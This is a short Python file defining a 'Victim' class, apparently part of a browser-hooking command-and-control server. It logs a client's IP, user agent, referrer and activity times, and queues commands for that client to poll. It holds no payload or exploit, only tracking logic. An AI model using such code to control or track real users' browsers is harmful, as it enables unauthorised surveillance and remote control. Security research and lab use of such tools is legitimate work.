import time


class Victim():

    def __init__(self, victim_id, request):
        first_seen = time.localtime()
        self.victim_id = victim_id
        self.ip = request.remote_addr
        self.user_agent = request.user_agent
        self.referrer = request.referrer
        self.first_seen = first_seen
        self.last_seen = first_seen
        self.command_queue = []
        self.current_page = ''

    def update_last_seen(self):
        self.last_seen = time.localtime()

    def queue_command(self, command):
        self.command_queue.append(command)

    def has_commands(self):
        return len(self.command_queue) > 0

    def poll_commands(self):
        return self.command_queue.pop()
